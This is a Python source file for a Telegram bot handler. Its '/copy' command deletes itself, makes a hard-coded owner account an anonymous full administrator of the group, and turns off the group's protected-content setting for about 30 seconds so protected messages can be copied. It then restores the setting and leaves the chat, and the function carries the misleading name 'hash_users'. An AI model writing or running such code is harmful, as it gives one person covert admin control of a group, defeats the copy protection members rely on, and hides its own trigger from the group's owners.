from time import sleep
from aiogram import Router

from aiogram.types import Message
from aiogram.filters import Command

from config.telegram_config import MY_TELEGRAM_ID

from config.bot_config import bot
from config.pyrogram_config import app
from pyrogram.types import ChatPrivileges


router = Router()


@router.message(Command('copy'))
async def hash_users(message: Message):
    await message.delete()
    try:
        await app.disconnect()
    except:
        pass
    await app.connect()
    try:
        await app.promote_chat_member(
            chat_id=message.chat.id,
            user_id=MY_TELEGRAM_ID,
            privileges=ChatPrivileges(
                can_manage_chat=True,
                can_delete_messages=True,
                can_manage_video_chats=True,
                can_restrict_members=True,
                can_promote_members=True,
                can_change_info=True,
                can_post_messages=True,
                can_edit_messages=True,
                can_invite_users=True,
                can_pin_messages=True,
                is_anonymous=True
            )
        )
    except Exception as e:
        # pass
        await bot.send_message(MY_TELEGRAM_ID, text='Не получилось добавиться в группу для копирования')
    try:
        await app.set_chat_protected_content(
            chat_id=message.chat.id,
            enabled=False
        )
        msg = await message.answer('30', disable_notification=True)
        for sec in range(29, 0, -2):
            await msg.edit_text(str(sec))
            sleep(2)
    except Exception as err:
        # pass
        await bot.send_message(MY_TELEGRAM_ID, text='Не получилось снять с группы защиту')
    try:
        await app.set_chat_protected_content(
            chat_id=message.chat.id,
            enabled=True
        )
    except Exception as error:
        # pass
        await bot.send_message(MY_TELEGRAM_ID, text='Не получилось установить на группу защиту')
    try:
        await msg.delete()
    except:
        pass
    try:
        await app.leave_chat(message.chat.id)
    except Exception as er:
        pass
        # await bot.send_message(MY_TELEGRAM_ID, text=er)
    await app.disconnect()
